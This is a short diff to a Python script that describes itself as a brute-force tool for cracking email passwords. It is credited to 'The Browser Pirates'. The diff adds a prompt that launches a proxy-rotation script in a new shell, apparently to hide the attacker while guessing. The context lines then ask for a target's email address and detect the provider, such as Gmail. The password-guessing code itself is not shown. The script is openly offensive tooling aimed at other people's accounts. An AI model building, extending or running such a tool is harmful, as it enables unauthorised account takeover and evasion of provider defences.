@@ -16,6 +16,14 @@ print		("\nThis tool is a bruter tool that is meant to crack email password.")
 print                    ("[+] Coded by The Browser Pirates [+]")
 
 #all data input begins here	
+proxyconfirm = input ("\nDo you want to enable proxy? [y/n]")
+if proxyconfirm == "y":
+	print ("Opening a new shell to generate proxies...")
+	os.system('start cmd /D /C "py proxychanger.py"')
+	
+if proxyconfirm == "n":
+    print("Proxies not activated.")
+    pass
 user = input("\nEnter Target's Email Address: ")	
 if 'gmail' in user:
     server = "gmail"
